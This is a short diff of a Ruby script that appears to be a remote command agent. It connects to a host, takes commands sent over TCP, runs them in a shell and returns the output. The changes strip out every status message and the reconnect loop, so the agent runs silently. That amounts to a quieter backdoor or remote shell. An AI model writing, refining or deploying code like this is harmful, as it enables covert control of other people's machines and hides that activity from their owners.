@@ -38,12 +38,8 @@ while loop == true do
 	begin
 		begin
 			inbound = TCPSocket.new host, port
-			puts "[!] Connected to host!"
 			rescue Errno::ECONNREFUSED
-			loop = true
-			puts "[-] Failed to establish connection."
-			puts "    Will try again soon."
-			sleep(5)
+			loop = false
 		end
 		iterating = true
 		array = [recip = nil, recport = nil, command = nil, id = nil]
@@ -69,7 +65,6 @@ while loop == true do
 		inbound = TCPServer.new recip, recport
 		ending = false
 		begin
-			puts "[*] Running: '#{command}'"
 			arr = `#{command}`.split("\n")
 			rescue Errno::ENOENT
 			arr = "Unkown command.|".split("|")
